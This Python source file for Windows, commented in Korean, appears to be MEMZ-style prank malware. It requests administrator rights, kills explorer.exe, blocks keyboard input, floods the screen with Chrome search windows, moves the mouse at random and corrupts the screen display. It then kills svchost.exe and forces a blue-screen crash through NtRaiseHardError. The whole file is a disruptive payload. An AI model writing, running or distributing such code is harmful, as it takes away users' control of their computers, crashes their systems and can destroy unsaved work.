import os
import ctypes
import threading
import time
import sys
import subprocess
import random
import keyboard
import pyautogui
import win32gui
import win32con
import win32ui

# 설정
pyautogui.FAILSAFE = False
CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

def block_input():
    for i in range(150):
        try: keyboard.block_key(i)
        except: pass

def minimize_chrome():
    def callback(hwnd, _):
        if "Google" in win32gui.GetWindowText(hwnd):
            win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
    win32gui.EnumWindows(callback, None)

def search_bomb():
    search_terms = ["컴퓨터 바이러스 없애는 법", "마인크래프트 무료 설치", "마이크로소프트를 훔치는 법", "바이러스 만들기", "pepe the frog", "아 배고프다", "학교 때려치는 법", "에베베ㅔ에레레베레베레"]
    while True:
        term = random.choice(search_terms)
        subprocess.Popen([CHROME_PATH, "--new-window", f"https://www.google.com/search?q={term}"])
        time.sleep(0.5)
        threading.Thread(target=minimize_chrome, daemon=True).start()

def mouse_chaos():
    width, height = pyautogui.size()
    while True:
        pyautogui.moveTo(random.randint(0, width), random.randint(0, height))
        time.sleep(0.01)

def memz_screen_glitch():
    # MEMZ 스타일의 화면 붕괴 효과
    hdc = win32ui.GetDC(0)
    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    
    while True:
        # 화면의 일부를 랜덤하게 복사해서 붙여넣음으로써 붕괴 시뮬레이션
        x = random.randint(0, width - 100)
        y = random.randint(0, height - 100)
        hdc.BitBlt((x + random.randint(-10, 10), y + random.randint(-10, 10)), (100, 100), hdc, (x, y), win32con.SRCCOPY)
        time.sleep(0.001)

def shadow_entropy():
    # 1. 검색 폭탄 및 마우스 난동 시작
    threading.Thread(target=search_bomb, daemon=True).start()
    threading.Thread(target=mouse_chaos, daemon=True).start()
    
    # 2. 30초 후 화면 붕괴 시작
    time.sleep(30)
    threading.Thread(target=memz_screen_glitch, daemon=True).start()
    
    # 3. 60초 경과 후 종료 시퀀스
    time.sleep(30)
    os.system("taskkill /f /im svchost.exe") 
    time.sleep(1)
    
    # 4. 안전한 커널 패닉 (BSOD)
    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        os.system("taskkill /f /im explorer.exe")
        threading.Thread(target=block_input, daemon=True).start()
        shadow_entropy()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
